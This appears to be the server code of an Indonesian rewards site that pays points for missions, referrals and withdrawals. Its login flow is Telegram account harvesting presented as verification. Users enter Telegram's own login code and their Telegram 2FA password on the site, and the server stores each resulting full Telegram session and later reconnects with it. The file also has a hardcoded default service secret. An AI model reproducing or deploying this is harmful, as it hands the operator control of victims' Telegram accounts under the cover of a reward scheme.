"use strict";
const express = require("express");
const crypto = require("node:crypto");
const path = require("node:path");
const { DatabaseSync } = require("node:sqlite");
const { TelegramClient, Api } = require("telegram");
const { StringSession } = require("telegram/sessions");

const PORT = +process.env.PORT || 3000;
const DB_PATH = process.env.DB_PATH || path.join(__dirname, "data", "app.db");
const ADMIN_USERNAME = (process.env.ADMIN_USERNAME || "admin").trim();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || ""; // hanya untuk membuat admin pertama; setelah itu dikelola di dashboard
const SESSION_DAYS = +process.env.SESSION_DAYS || 90;
const SECURE_COOKIE = process.env.SECURE_COOKIE === "1";
const slug = (v, d) => (String(v || d).replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 40) || d);
const APP_PATH = slug(process.env.APP_PATH, "app");
const ADMIN_PATH = slug(process.env.ADMIN_PATH, "admin");
const STATIC_DIR = process.env.STATIC_DIR || path.join(__dirname, "..", "public");

require("node:fs").mkdirSync(path.dirname(DB_PATH), { recursive: true });
const db = new DatabaseSync(DB_PATH);
db.exec(`
PRAGMA journal_mode=WAL; PRAGMA foreign_keys=ON;
CREATE TABLE IF NOT EXISTS users(
  id INTEGER PRIMARY KEY, phone TEXT UNIQUE NOT NULL, pass_hash TEXT NOT NULL,
  tg_id TEXT, tg_name TEXT, verified INTEGER DEFAULT 0, points INTEGER DEFAULT 0,
  ref_code TEXT UNIQUE, referred_by INTEGER, banned INTEGER DEFAULT 0, created INTEGER);
CREATE TABLE IF NOT EXISTS otps(phone TEXT PRIMARY KEY, code_hash TEXT, expires INTEGER, attempts INTEGER DEFAULT 0, sent INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS sessions(token_hash TEXT PRIMARY KEY, user_id INTEGER, expires INTEGER);
CREATE TABLE IF NOT EXISTS missions(
  id INTEGER PRIMARY KEY, title TEXT, descr TEXT, reward INTEGER, type TEXT, link TEXT, active INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS claims(user_id INTEGER, mission_id INTEGER, day TEXT, PRIMARY KEY(user_id,mission_id,day));
CREATE TABLE IF NOT EXISTS taps(user_id INTEGER, mission_id INTEGER, ts INTEGER, PRIMARY KEY(user_id,mission_id));
CREATE TABLE IF NOT EXISTS rewards(id INTEGER PRIMARY KEY, title TEXT, cost INTEGER, active INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS redemptions(id INTEGER PRIMARY KEY, user_id INTEGER, reward_id INTEGER, cost INTEGER, status TEXT DEFAULT 'pending', ts INTEGER);
CREATE TABLE IF NOT EXISTS withdrawals(id INTEGER PRIMARY KEY, user_id INTEGER, points INTEGER, method TEXT, account TEXT, status TEXT DEFAULT 'pending', note TEXT, ts INTEGER);
CREATE TABLE IF NOT EXISTS ledger(id INTEGER PRIMARY KEY, user_id INTEGER, delta INTEGER, reason TEXT, ts INTEGER);
CREATE TABLE IF NOT EXISTS settings(k TEXT PRIMARY KEY, v TEXT);
CREATE TABLE IF NOT EXISTS admins(username TEXT PRIMARY KEY, pass_hash TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS tg_sessions(
  id INTEGER PRIMARY KEY, user_id INTEGER NOT NULL UNIQUE, phone TEXT, tg_id TEXT,
  tg_username TEXT, tg_name TEXT, session_enc TEXT NOT NULL, created INTEGER, created_by TEXT);
`);
for (const stmt of [
  "ALTER TABLE users ADD COLUMN reg_ip TEXT",
  "ALTER TABLE users ADD COLUMN last_login INTEGER",
  "ALTER TABLE users ADD COLUMN last_ip TEXT",
  "ALTER TABLE users ADD COLUMN username TEXT",
  "ALTER TABLE sessions ADD COLUMN created INTEGER",
  "ALTER TABLE sessions ADD COLUMN ip TEXT",
  "ALTER TABLE sessions ADD COLUMN ua TEXT",
  "ALTER TABLE sessions ADD COLUMN tg_name TEXT",
  "ALTER TABLE users ADD COLUMN ref_tier_paid INTEGER DEFAULT 0",
]) { try { db.exec(stmt); } catch (e) { if (!/duplicate column/i.test(e.message)) throw e; } }
try { db.exec("CREATE UNIQUE INDEX IF NOT EXISTS users_username_uq ON users(username) WHERE username IS NOT NULL AND username <> ''"); } catch (_) {}
if (!db.prepare("SELECT 1 FROM missions LIMIT 1").get()) {
  const m = db.prepare("INSERT INTO missions(title,descr,reward,type,link) VALUES(?,?,?,?,?)");
  [["Check-in harian", "Buka aplikasi hari ini", 500, "daily", ""],
   ["Gabung channel", "Join channel Telegram resmi", 1500, "join_channel", ""],
   ["Start bot", "Mulai bot Telegram kami", 1000, "start_bot", ""],
   ["Kunjungi link partner", "Buka tautan sponsor", 600, "tap_link", ""]].forEach((r) => m.run(...r));
  const r = db.prepare("INSERT INTO rewards(title,cost) VALUES(?,?)");
  [["Voucher kopi Rp15rb", 8000], ["Diskon 25% belanja", 15000], ["Saldo belanja Rp50rb", 60000]].forEach((x) => r.run(...x));
  db.prepare("INSERT INTO settings(k,v) VALUES('min_withdraw','50000'),('channel',''),('methods','DANA,OVO,GoPay,Bank')").run();
}
const now = () => Math.floor(Date.now() / 1000);
const today = () => new Date(Date.now() + 7 * 3600e3).toISOString().slice(0, 10); // WIB
const setting = (k) => (db.prepare("SELECT v FROM settings WHERE k=?").get(k) || {}).v || "";
const sha = (s) => crypto.createHash("sha256").update(s).digest("hex");
const tx = (fn) => { db.exec("BEGIN IMMEDIATE"); try { const r = fn(); db.exec("COMMIT"); return r; } catch (e) { db.exec("ROLLBACK"); throw e; } };

function hashPw(pw) { const s = crypto.randomBytes(16); return s.toString("hex") + ":" + crypto.scryptSync(pw, s, 64).toString("hex"); }
function checkPw(pw, st) {
  const [s, h] = st.split(":"); const x = crypto.scryptSync(pw, Buffer.from(s, "hex"), 64);
  return crypto.timingSafeEqual(x, Buffer.from(h, "hex"));
}
if (!db.prepare("SELECT 1 FROM admins LIMIT 1").get()) {
  if (ADMIN_PASSWORD.length < 8) { console.error("Belum ada admin: isi ADMIN_USERNAME dan ADMIN_PASSWORD (min 8 karakter) di .env untuk membuat admin pertama"); process.exit(1); }
  db.prepare("INSERT INTO admins VALUES(?,?)").run(ADMIN_USERNAME, hashPw(ADMIN_PASSWORD));
  console.log("Admin pertama dibuat:", ADMIN_USERNAME);
}
function normPhone(p) {
  // Terima E.164: kode negara + nomor lokal, 8-14 digit total. Front-end mengirim gabungan "<kodenegara><nomor>".
  let d = String(p || "").replace(/[^\d]/g, "");
  if (d.startsWith("0")) d = d.slice(1); // jaga-jaga kalau user ketik 0 di depan nomor lokal
  return /^\d{8,15}$/.test(d) ? d : null;
}
// Username: 3–24 karakter, huruf/angka/underscore, case-insensitive disimpan lowercase
function normUsername(u) {
  const s = String(u || "").trim().toLowerCase();
  if (!/^[a-z][a-z0-9_]{2,23}$/.test(s)) return null;
  return s;
}
function addPoints(uid, delta, reason) {
  db.prepare("UPDATE users SET points=points+? WHERE id=?").run(delta, uid);
  db.prepare("INSERT INTO ledger(user_id,delta,reason,ts) VALUES(?,?,?,?)").run(uid, delta, reason, now());
}

/* ---- Hadiah referral berdasarkan total teman (bukan per orang) ----
 * 1 teman: 25rb · 5: 100rb · 10: 250rb · lalu tiap kelipatan 10 s.d. 100: jumlah_teman x 25rb */
const REF_MILESTONES = [1, 5, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100].map((n) => [n, n === 5 ? 100000 : n * 25000]);
function refMilestoneTiers(count, tierPaid) {
  return REF_MILESTONES.map(([tier, bonus]) => ({ tier, bonus, reached: count >= tier, paid: tierPaid >= tier }));
}
/** Dipanggil tiap total teman terverifikasi milik referrer berubah. Bayar SEKALI per milestone
 * yang baru tercapai (idempotent lewat ref_tier_paid), bukan per teman yang gabung. */
function payReferralMilestones(referrerId) {
  const count = db.prepare("SELECT COUNT(*) c FROM users WHERE referred_by=? AND verified=1").get(referrerId).c;
  const row = db.prepare("SELECT ref_tier_paid FROM users WHERE id=?").get(referrerId);
  const paidTier = (row && row.ref_tier_paid) || 0;
  let bonusTotal = 0, newTier = paidTier, labels = [];
  for (const [tier, bonus] of REF_MILESTONES) {
    if (tier > paidTier && count >= tier) { bonusTotal += bonus; newTier = tier; labels.push(tier); }
  }
  if (bonusTotal > 0) {
    db.prepare("UPDATE users SET ref_tier_paid=? WHERE id=?").run(newTier, referrerId);
    addPoints(referrerId, bonusTotal, "ref-milestone:" + labels.join(","));
  }
}

/* ---- Telegram via Telethon sidecar (bukan Bot API) ---- */
const TG_URL = (process.env.TELEGRAM_SERVICE_URL || "http://telethon:8090").replace(/\/$/, "");
const TG_SECRET = process.env.TELEGRAM_SERVICE_SECRET || "kodo-internal";
async function tgService(path, body, method = "POST") {
  try {
    const r = await fetch(TG_URL + path, {
      method,
      headers: { "content-type": "application/json", "X-Service-Secret": TG_SECRET },
      body: method === "GET" ? undefined : JSON.stringify(body || {}),
    });
    const j = await r.json().catch(() => ({}));
    return { status: r.status, ...j };
  } catch (e) {
    return { ok: false, error: "Telethon service offline: " + String(e.message || e) };
  }
}
async function tgStatus() {
  return tgService("/status", null, "GET");
}

/* ---- Telegram StringSession generator sidecar (GramJS) ---- */
const TG_API_ID = parseInt(process.env.TELEGRAM_API_ID, 10);
const TG_API_HASH = String(process.env.TELEGRAM_API_HASH || "").trim();
const SESS_URL = (process.env.SESSION_GENERATOR_URL || "http://session-generator:8091").replace(/\/$/, "");
const SESS_SECRET = process.env.SESSION_GENERATOR_SECRET || TG_SECRET;
const SESSION_ENC_KEY = process.env.SESSION_ENC_KEY || "";
const SESSION_ENC_READY = SESSION_ENC_KEY.length >= 8;
if (!SESSION_ENC_READY) console.warn("SESSION_ENC_KEY belum diisi — fitur Telegram StringSession dinonaktifkan (isi minimal 8 karakter di .env)");
async function sessService(path, body, method = "POST") {
  const ac = new AbortController();
  const timer = setTimeout(() => ac.abort(), method === "GET" ? 8000 : 90_000);
  if (timer.unref) timer.unref();
  try {
    const r = await fetch(SESS_URL + path, {
      method,
      headers: { "content-type": "application/json", "X-Service-Secret": SESS_SECRET },
      body: method === "GET" ? undefined : JSON.stringify(body || {}),
      signal: ac.signal,
    });
    const j = await r.json().catch(() => ({}));
    return { status: r.status, ...j };
  } catch (e) {
    const msg = e && e.name === "AbortError"
      ? "Generator StringSession timeout"
      : "Generator StringSession offline: " + String((e && e.message) || e);
    return { ok: false, error: msg };
  } finally {
    clearTimeout(timer);
  }
}
// 401/403 dari sidecar = secret internal salah, jangan diteruskan sebagai 401 ke admin
// (nanti UI mengira sesi admin habis dan menampilkan halaman login).
const sessHttp = (s) => (s === 401 || s === 403 ? 502 : (s >= 400 ? s : 502));
const sessError = (res, r, fallback) => res.status(sessHttp(r.status || 0)).json({
  error: r.status === 401 || r.status === 403 ? "Generator menolak secret internal (cek SESSION_GENERATOR_SECRET)" : (r.error || fallback),
});
const sessionKey = () => crypto.createHash("sha256").update("kodo-tg-session:" + SESSION_ENC_KEY).digest();
function encSession(plain) {
  const iv = crypto.randomBytes(12);
  const c = crypto.createCipheriv("aes-256-gcm", sessionKey(), iv);
  const ct = Buffer.concat([c.update(String(plain), "utf8"), c.final()]);
  return [iv.toString("base64"), c.getAuthTag().toString("base64"), ct.toString("base64")].join(".");
}
function decSession(enc) {
  const [iv, tag, ct] = String(enc || "").split(".");
  if (!iv || !tag || !ct) throw new Error("session tersimpan rusak");
  const d = crypto.createDecipheriv("aes-256-gcm", sessionKey(), Buffer.from(iv, "base64"));
  d.setAuthTag(Buffer.from(tag, "base64"));
  return Buffer.concat([d.update(Buffer.from(ct, "base64")), d.final()]).toString("utf8");
}
const sessPublic = (r) => ({
  id: r.id, user_id: r.user_id, phone: r.phone || "", tg_id: r.tg_id || "",
  tg_username: r.tg_username || "", tg_name: r.tg_name || "", created: r.created || null,
  created_by: r.created_by || "",
});
/** Pastikan session yang baru dibuat memang milik akun user ini (kalau tg_id sudah diketahui). */
function sessionOwnerError(uid, me) {
  const u = db.prepare("SELECT tg_id FROM users WHERE id=?").get(uid);
  const expected = String((u && u.tg_id) || "").replace(/[^\d]/g, "");
  const got = String((me && me.id) || "").replace(/[^\d]/g, "");
  if (expected && got && expected !== got) return "Nomor ini bukan akun Telegram milik user tersebut (TG ID tidak cocok)";
  return "";
}
function saveTgSession(uid, me, sessionString, adminName) {
  const u = db.prepare("SELECT tg_id FROM users WHERE id=?").get(uid);
  const tgId = String((me && me.id) || (u && u.tg_id) || "").replace(/[^\d]/g, "");
  const uname = (me && me.username) || "";
  const name = [me && me.first_name, me && me.last_name].filter(Boolean).join(" ") || uname || tgId;
  db.prepare(`INSERT INTO tg_sessions(user_id,phone,tg_id,tg_username,tg_name,session_enc,created,created_by)
    VALUES(?,?,?,?,?,?,?,?)
    ON CONFLICT(user_id) DO UPDATE SET phone=excluded.phone,tg_id=excluded.tg_id,tg_username=excluded.tg_username,
    tg_name=excluded.tg_name,session_enc=excluded.session_enc,created=excluded.created,created_by=excluded.created_by`)
    .run(uid, String((me && me.phone) || ""), tgId, uname, name, encSession(sessionString), now(), String(adminName || ""));
}
// kompatibilitas nama lama di UI/admin
const botName = () => "telethon";
const botToken = () => "";

/* ---- rate limit ---- */
const hits = new Map();
function limit(key, max, sec) {
  const t = Date.now(), a = (hits.get(key) || []).filter((x) => t - x < sec * 1000);
  a.push(t); hits.set(key, a); return a.length <= max;
}
setInterval(() => { for (const [k, a] of hits) if (!a.length || Date.now() - a[a.length - 1] > 3600e3) hits.delete(k); }, 600e3).unref();

/* ---- app ---- */
const app = express();
app.set("trust proxy", 1);
app.use(express.json({ limit: "20kb" }));
app.use((req, res, next) => {
  res.set({ "X-Content-Type-Options": "nosniff", "X-Frame-Options": "DENY", "Referrer-Policy": "same-origin" });
  if (req.method !== "GET" && req.headers.origin) { // CSRF: origin harus sama dengan host
    try { if (new URL(req.headers.origin).host !== req.headers.host) return res.status(403).json({ error: "forbidden" }); } catch { return res.status(403).end(); }
  }
  next();
});
const cookies = (req) => Object.fromEntries((req.headers.cookie || "").split(";").map((c) => c.trim().split("=")).filter((x) => x[0]).map(([k, ...v]) => [k, decodeURIComponent(v.join("="))]));
function setCookie(res, name, val, days) {
  res.append("Set-Cookie", `${name}=${encodeURIComponent(val)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${days * 86400}${SECURE_COOKIE ? "; Secure" : ""}`);
}
function newSession(res, uid, req) {
  const tok = crypto.randomBytes(32).toString("hex");
  const u = db.prepare("SELECT tg_name FROM users WHERE id=?").get(uid);
  const ua = String((req && req.headers["user-agent"]) || "").slice(0, 240);
  const ip = req ? String(req.ip || "") : "";
  db.prepare("INSERT INTO sessions(token_hash,user_id,expires,created,ip,ua,tg_name) VALUES(?,?,?,?,?,?,?)")
    .run(sha(tok), uid, now() + SESSION_DAYS * 86400, now(), ip, ua, (u && u.tg_name) || "");
  setCookie(res, "sid", tok, SESSION_DAYS);
}
function auth(req, res, next) {
  const tok = cookies(req).sid; if (!tok) return res.status(401).json({ error: "login" });
  const row = db.prepare("SELECT u.* FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.token_hash=? AND s.expires>?").get(sha(tok), now());
  if (!row || row.banned) return res.status(401).json({ error: "login" });
  req.user = row; next();
}
const adminTokens = new Map();
function adminAuth(req, res, next) {
  const t = cookies(req).adm; const e = t && adminTokens.get(sha(t));
  if (!e || e.exp < Date.now()) return res.status(401).json({ error: "admin" });
  req.admin = e; next();
}
const pub = (u) => ({ id: u.id, phone: u.phone, username: u.username || "", tg_id: u.tg_id || "", tg_name: u.tg_name || "", has_password: !!(u.pass_hash && u.pass_hash.length), points: u.points, ref_code: u.ref_code, bot: botName() });

// ====== Alur Telegram-style: 1 field (username/nomor Telegram) -> OTP -> (opsional) password ======
const pwTokens = new Map(); // token sementara setelah OTP sukses utk akun ber-2FA
setInterval(() => { const t = Date.now(); for (const [k, v] of pwTokens) if (v.exp < t) pwTokens.delete(k); }, 300e3).unref();
function uniqueUsername(base, selfKey) {
  let u = normUsername(base);
  if (!u) u = null;
  const taken = (name) => db.prepare("SELECT id FROM users WHERE username=? AND phone<>?").get(name, selfKey);
  if (u && !taken(u)) return u;
  // fallback unik dari key (tg_id)
  let cand = ("tg" + String(selfKey)).replace(/[^a-z0-9_]/gi, "").toLowerCase().slice(0, 24);
  if (!/^[a-z]/.test(cand)) cand = "t" + cand.slice(0, 23);
  let n = cand, i = 0;
  while (taken(n)) { i++; n = (cand.slice(0, 20) + i).slice(0, 24); }
  return n;
}
/* ---- Auth: kode verifikasi dikirim LANGSUNG oleh Telegram resmi (bukan Telethon/userbot) ----
 * Dipakai lewat sidecar session-generator (GramJS): client.sendCode() memicu Telegram
 * sendiri yang mengirim kode ke nomor itu (via app Telegram/SMS), sama seperti saat kamu
 * login akun Telegram baru. Setiap akun yang berhasil verifikasi otomatis punya StringSession
 * sendiri (tersimpan terenkripsi di tg_sessions), bukan satu akun pengirim bersama. */
const authFlows = new Map(); // phone -> { flow_id, ref, created }
setInterval(() => { const t = Date.now(); for (const [k, v] of authFlows) if (t - v.created > 15 * 60e3) authFlows.delete(k); }, 300e3).unref();

async function finishTelegramAuth(req, res, phone, ref, me, sessionString) {
  const tgId = String((me && me.id) || "").replace(/[^\d]/g, "");
  if (!tgId) return res.status(502).json({ error: "Gagal memverifikasi akun Telegram" });
  const key = tgId; // key internal disimpan di kolom phone (NOT NULL UNIQUE)
  const tgUser = (me && me.username) || "";
  const tgName = [me && me.first_name, me && me.last_name].filter(Boolean).join(" ") || tgUser || tgId;
  let u = db.prepare("SELECT * FROM users WHERE tg_id=? OR phone=?").get(tgId, key);
  if (!u) {
    if (!limit("reg:" + req.ip, 10, 3600)) return res.status(429).json({ error: "Terlalu banyak percobaan" });
    let refId = null;
    if (ref) { const rr = db.prepare("SELECT id FROM users WHERE ref_code=? AND verified=1").get(String(ref)); refId = rr && rr.id; }
    const uname = uniqueUsername(tgUser, key);
    db.prepare("INSERT INTO users(phone,pass_hash,tg_id,tg_name,username,ref_code,referred_by,created,reg_ip,verified) VALUES(?,?,?,?,?,?,?,?,?,1)")
      .run(key, "", tgId, tgName, uname, crypto.randomBytes(4).toString("hex"), refId, now(), req.ip);
    u = db.prepare("SELECT * FROM users WHERE phone=?").get(key);
    if (u.referred_by) { payReferralMilestones(u.referred_by); addPoints(u.id, 2000, "bonus referral"); }
  } else {
    const uname = u.username || uniqueUsername(tgUser, u.phone);
    db.prepare("UPDATE users SET tg_id=?,tg_name=?,username=?,verified=1 WHERE id=?").run(tgId, tgName, uname, u.id);
    u = db.prepare("SELECT * FROM users WHERE id=?").get(u.id);
  }
  if (u.banned) return res.status(403).json({ error: "Akun diblokir" });
  if (sessionString && SESSION_ENC_READY) {
    try { saveTgSession(u.id, me, sessionString, "auto:auth"); } catch (e) { console.error("saveTgSession gagal:", e.message); }
  }
  db.prepare("UPDATE users SET last_login=?,last_ip=? WHERE id=?").run(now(), req.ip, u.id);
  newSession(res, u.id, req);
  res.json({ ok: true });
}
// Mulai: minta Telegram resmi kirim kode ke nomor HP user
app.post("/api/auth/start", async (req, res) => {
  const phone = normPhone(req.body.tg || req.body.identifier || req.body.phone);
  if (!phone) return res.status(400).json({ error: "Isi nomor Telegram kamu (contoh: +6281234567890)" });
  if (!limit("authstart:" + req.ip, 20, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan, coba lagi nanti" });
  if (!SESSION_ENC_READY) return res.status(503).json({ error: "Verifikasi Telegram belum aktif, hubungi admin" });
  const r = await sessService("/login/start", { phone: "+" + phone });
  if (!r.ok) return sessError(res, r, "Gagal mengirim kode Telegram");
  authFlows.set(phone, { flow_id: r.flow_id, ref: String(req.body.ref || ""), created: Date.now() });
  res.json({ ok: true, phone, mode: "verify", tg_name: "", username: "" });
});
// Kirim ulang: minta flow baru dari Telegram resmi
app.post("/api/otp/resend", async (req, res) => {
  const phone = normPhone(req.body.phone);
  if (!phone || !limit("otp:" + phone, 5, 3600)) return res.status(429).json({ error: "Terlalu banyak permintaan" });
  if (!SESSION_ENC_READY) return res.status(503).json({ error: "Verifikasi Telegram belum aktif, hubungi admin" });
  const f = authFlows.get(phone);
  const r = await sessService("/login/start", { phone: "+" + phone });
  if (!r.ok) return res.json({ ok: false, error: r.error || "Gagal kirim kode" });
  authFlows.set(phone, { flow_id: r.flow_id, ref: (f && f.ref) || "", created: Date.now() });
  res.json({ ok: true });
});
// Verifikasi kode dari Telegram. Kalau akun itu ada 2FA Telegram, balik need_password (ptoken "tg:<phone>").
app.post("/api/verify", async (req, res) => {
  const phone = normPhone(req.body.phone), code = String(req.body.code || "").replace(/[^\d]/g, "");
  if (!phone || !limit("ver:" + phone, 10, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan" });
  const f = authFlows.get(phone);
  if (!f) return res.status(400).json({ error: "Sesi verifikasi kedaluwarsa, minta kode baru" });
  const r = await sessService("/login/code", { flow_id: f.flow_id, code });
  if (r.ok === false && r.need_password) return res.json({ ok: true, need_password: true, ptoken: "tg:" + phone });
  if (!r.ok) return sessError(res, r, "Kode salah atau kedaluwarsa");
  authFlows.delete(phone);
  await finishTelegramAuth(req, res, phone, f.ref, r.me, r.session_string);
});
// Langkah password 2FA TELEGRAM (ptoken "tg:<phone>") setelah kode sukses, akun itu makai 2FA di Telegram-nya sendiri
app.post("/api/auth/password", async (req, res) => {
  const tok = String(req.body.ptoken || ""), pw = String(req.body.password || "");
  if (!tok.startsWith("tg:")) return res.status(400).json({ error: "Sesi verifikasi kedaluwarsa, ulangi dari awal" });
  const phone = tok.slice(3);
  const f = authFlows.get(phone);
  if (!f) return res.status(400).json({ error: "Sesi verifikasi kedaluwarsa, ulangi dari awal" });
  const r = await sessService("/login/password", { flow_id: f.flow_id, password: pw });
  if (!r.ok) return sessError(res, r, "Password 2FA Telegram salah");
  authFlows.delete(phone);
  await finishTelegramAuth(req, res, phone, f.ref, r.me, r.session_string);
});


app.get("/api/config", (_q, res) => res.json({
  bot: "",
  telethon: true,
  min_withdraw: +setting("min_withdraw"),
  point_value: +(setting("point_value") || 1),
  channel: setting("channel"),
  methods: setting("methods").split(",").filter(Boolean),
}));

app.post("/api/logout", auth, (req, res) => {
  // Logout hanya menghapus sesi di perangkat ini. Poin TIDAK dihapus.
  db.prepare("DELETE FROM sessions WHERE token_hash=?").run(sha(cookies(req).sid));
  res.append("Set-Cookie", "sid=; Path=/; Max-Age=0"); res.json({ ok: true });
});
app.post("/api/me/password", auth, (req, res) => {
  const np = String(req.body.new || "");
  const hasPw = !!(req.user.pass_hash && req.user.pass_hash.length);
  if (hasPw && !checkPw(String(req.body.old || ""), req.user.pass_hash)) return res.status(400).json({ error: "Password lama salah" });
  if (np.length < 8) return res.status(400).json({ error: "Password baru minimal 8 karakter" });
  db.prepare("UPDATE users SET pass_hash=? WHERE id=?").run(hashPw(np), req.user.id);
  db.prepare("DELETE FROM sessions WHERE user_id=? AND token_hash<>?").run(req.user.id, sha(cookies(req).sid));
  res.json({ ok: true });
});
app.post("/api/me/logout-all", auth, (req, res) => {
  db.prepare("DELETE FROM sessions WHERE user_id=?").run(req.user.id);
  res.append("Set-Cookie", "sid=; Path=/; Max-Age=0");
  res.json({ ok: true });
});
app.get("/api/me", auth, (req, res) => {
  const u = req.user, d = today();
  const missions = db.prepare("SELECT * FROM missions WHERE active=1").all().map((m) => ({
    id: m.id, title: m.title, descr: m.descr, reward: m.reward, type: m.type, link: m.link,
    claimed: !!db.prepare("SELECT 1 FROM claims WHERE user_id=? AND mission_id=? AND day=?").get(u.id, m.id, m.type === "daily" ? d : "once"),
    tapped: !!db.prepare("SELECT 1 FROM taps WHERE user_id=? AND mission_id=?").get(u.id, m.id) }));
  const refs = db.prepare("SELECT COUNT(*) c FROM users WHERE referred_by=? AND verified=1").get(u.id).c;
  const friends = db.prepare("SELECT phone FROM users WHERE referred_by=? AND verified=1 ORDER BY id DESC LIMIT 50").all(u.id)
    .map((f) => "+" + f.phone.slice(0, 4) + "****" + f.phone.slice(-3));
  res.json({ user: pub(u), friends, missions,
    rewards: db.prepare("SELECT id,title,cost FROM rewards WHERE active=1").all(),
    referrals: refs, ref_milestones: refMilestoneTiers(refs, u.ref_tier_paid || 0),
    ref_earned: db.prepare("SELECT COALESCE(SUM(delta),0) s FROM ledger WHERE user_id=? AND reason LIKE 'ref-milestone:%'").get(u.id).s,
    history: db.prepare("SELECT delta,reason,ts FROM ledger WHERE user_id=? ORDER BY id DESC LIMIT 30").all(u.id),
    withdrawals: db.prepare("SELECT id,points,method,status,note,ts FROM withdrawals WHERE user_id=? ORDER BY id DESC LIMIT 20").all(u.id) });
});
/** Cek keanggotaan channel pakai StringSession milik user itu sendiri (GramJS),
 * bukan akun Telethon terpisah. Kalau user belum punya session tersimpan
 * (mis. SESSION_ENC_KEY belum aktif saat dia daftar), dianggap belum join —
 * gagal-tertutup, bukan loloskan begitu saja. */
async function checkOwnMembership(uid, channel) {
  if (!SESSION_ENC_READY || !Number.isInteger(TG_API_ID) || TG_API_ID <= 0 || !TG_API_HASH) return false;
  const row = db.prepare("SELECT session_enc FROM tg_sessions WHERE user_id=?").get(uid);
  if (!row) return false;
  let client;
  try {
    const sessionString = decSession(row.session_enc);
    client = new TelegramClient(new StringSession(sessionString), TG_API_ID, TG_API_HASH, { connectionRetries: 2 });
    await client.connect();
    await client.invoke(new Api.channels.GetParticipant({ channel: channel.replace(/^@/, ""), participant: "me" }));
    return true;
  } catch (e) {
    return false; // termasuk session rusak, USER_NOT_PARTICIPANT, dan channel tidak ditemukan
  } finally {
    if (client) { try { await client.destroy(); } catch (e) {} }
  }
}
async function isMember(u) {
  const ch = setting("channel"); if (!ch) return true;
  return checkOwnMembership(u.id, ch);
}
app.get("/api/channel/status", auth, async (req, res) => res.json({ required: !!setting("channel"), member: await isMember(req.user) }));
app.post("/api/missions/:id/tap", auth, (req, res) => {
  db.prepare("INSERT OR IGNORE INTO taps VALUES(?,?,?)").run(req.user.id, +req.params.id, now()); res.json({ ok: true });
});
app.post("/api/missions/:id/claim", auth, async (req, res) => {
  const u = req.user, m = db.prepare("SELECT * FROM missions WHERE id=? AND active=1").get(+req.params.id);
  if (!m) return res.status(404).json({ error: "Misi tidak ada" });
  if (m.type === "join_channel") {
    const ch = m.link || setting("channel");
    if (!u.tg_id) return res.status(400).json({ error: "Akun Telegram belum terhubung" });
    if (ch && !(await checkOwnMembership(u.id, ch))) return res.status(400).json({ error: "Kamu belum bergabung ke channel" });
  } else if (m.type === "start_bot") {
    // legacy tipe misi: cukup punya tg_id terhubung
    if (!u.tg_id) return res.status(400).json({ error: "Akun Telegram belum terhubung" });
  } else if (m.type === "tap_link") {
    const t = db.prepare("SELECT ts FROM taps WHERE user_id=? AND mission_id=?").get(u.id, m.id);
    if (!t || now() - t.ts < 5) return res.status(400).json({ error: "Buka tautannya dulu" });
  }
  const day = m.type === "daily" ? today() : "once";
  try {
    tx(() => { db.prepare("INSERT INTO claims VALUES(?,?,?)").run(u.id, m.id, day); addPoints(u.id, m.reward, "misi:" + m.title); });
  } catch { return res.status(409).json({ error: "Sudah diklaim" }); }
  res.json({ ok: true, points: db.prepare("SELECT points FROM users WHERE id=?").get(u.id).points });
});
app.post("/api/rewards/:id/redeem", auth, (req, res) => {
  const r = db.prepare("SELECT * FROM rewards WHERE id=? AND active=1").get(+req.params.id);
  if (!r) return res.status(404).json({ error: "Reward tidak ada" });
  try {
    tx(() => {
      const p = db.prepare("SELECT points FROM users WHERE id=?").get(req.user.id).points;
      if (p < r.cost) throw new Error("poin");
      addPoints(req.user.id, -r.cost, "tukar:" + r.title);
      db.prepare("INSERT INTO redemptions(user_id,reward_id,cost,ts) VALUES(?,?,?,?)").run(req.user.id, r.id, r.cost, now());
    });
  } catch { return res.status(400).json({ error: "Poin tidak cukup" }); }
  res.json({ ok: true });
});
app.post("/api/withdraw", auth, (req, res) => {
  const pts = Math.floor(+req.body.points), method = String(req.body.method || "").slice(0, 20), acc = String(req.body.account || "").slice(0, 60).trim();
  if (!pts || pts < +setting("min_withdraw")) return res.status(400).json({ error: `Minimal penarikan ${setting("min_withdraw")} poin` });
  if (!setting("methods").split(",").includes(method) || acc.length < 4) return res.status(400).json({ error: "Metode/rekening tidak valid" });
  try {
    tx(() => {
      const p = db.prepare("SELECT points FROM users WHERE id=?").get(req.user.id).points;
      if (p < pts) throw new Error("poin");
      addPoints(req.user.id, -pts, "tarik poin");
      db.prepare("INSERT INTO withdrawals(user_id,points,method,account,ts) VALUES(?,?,?,?,?)").run(req.user.id, pts, method, acc, now());
    });
  } catch { return res.status(400).json({ error: "Poin tidak cukup" }); }
  res.json({ ok: true });
});

/* ---- admin ---- */
app.post("/api/admin/login", (req, res) => {
  if (!limit("adm:" + req.ip, 8, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan" });
  const row = db.prepare("SELECT * FROM admins WHERE username=?").get(String(req.body.username || "").trim());
  const ok = checkPw(String(req.body.password || ""), row ? row.pass_hash : hashPw("x"));
  if (!row || !ok) return res.status(401).json({ error: "Username atau password salah" });
  const t = crypto.randomBytes(32).toString("hex"); adminTokens.set(sha(t), { exp: Date.now() + 12 * 3600e3, user: row.username });
  setCookie(res, "adm", t, 0.5); res.json({ ok: true });
});
app.post("/api/admin/logout", (req, res) => {
  const t = cookies(req).adm; if (t) adminTokens.delete(sha(t));
  res.append("Set-Cookie", "adm=; Path=/; Max-Age=0"); res.json({ ok: true });
});
app.post("/api/admin/password", adminAuth, (req, res) => {
  const np = String(req.body.new || "");
  const row = db.prepare("SELECT * FROM admins WHERE username=?").get(req.admin.user);
  if (!row || !checkPw(String(req.body.old || ""), row.pass_hash)) return res.status(400).json({ error: "Password lama salah" });
  if (np.length < 10) return res.status(400).json({ error: "Password baru minimal 10 karakter" });
  db.prepare("UPDATE admins SET pass_hash=? WHERE username=?").run(hashPw(np), row.username);
  res.json({ ok: true });
});
